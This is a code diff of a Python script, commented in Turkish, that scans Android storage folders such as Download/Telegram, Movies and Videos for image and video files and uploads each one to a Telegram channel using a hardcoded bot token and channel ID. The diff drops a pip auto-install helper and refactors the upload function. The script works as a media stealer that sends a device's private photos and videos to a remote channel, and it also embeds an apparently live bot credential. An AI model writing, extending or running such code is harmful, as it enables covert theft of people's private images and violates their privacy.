@@ -1,23 +1,8 @@
 import os
 import requests
-import subprocess
 
 BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
 CHANNEL_ID = "@p8JdyixgqKFlMjA0"
-
-# Gerekli kütüphanelerin kurulumu
-def install(package):
-    try:
-        subprocess.check_call(["pip", "install", package])
-    except Exception as e:
-        print(f"{package} kurulurken hata oluştu: {e}")
-
-# requests kütüphanesini kontrol et
-try:
-    import requests
-except ImportError:
-    print("requests kütüphanesi bulunamadı, kuruluyor...")
-    install("requests")
 
 # Kullanıcıdan isim alma
 name = input("Lütfen bir isim girin: ")
@@ -40,20 +25,29 @@ directories = [
     "/storage/emulated/0/Movies/Twitter/",
     "/storage/emulated/0/Download/Telegram/",
     "/storage/emulated/0/Movies/",
-    "/storage/emulated/0/Videos/" 
+    "/storage/emulated/0/Videos/"
 ]
 
 image_extensions = [".jpg", ".jpeg", ".png", ".gif"]
 video_extensions = [".mp4", ".mov", ".avi"]
 
 def send_media_to_channel(file_path):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto" if file_path.endswith(tuple(image_extensions)) else f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
-    
+    # Dosya türüne göre uygun URL belirle
+    if file_path.endswith(tuple(image_extensions)):
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        media_type = "photo"
+    elif file_path.endswith(tuple(video_extensions)):
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
+        media_type = "video"
+    else:
+        return  # Desteklenmeyen dosya türü
+
     with open(file_path, "rb") as media_file:
         data = {"chat_id": CHANNEL_ID}
-        files = {"photo" if file_path.endswith(tuple(image_extensions)) else "video": media_file}
-        
+        files = {media_type: media_file}
+
         response = requests.post(url, data=data, files=files)
+        
         if response.status_code == 200:
             print(f"Telegram'a gönderiliyor: {file_path}")
             print(f"Telegram'a gönderildi: {file_path}")
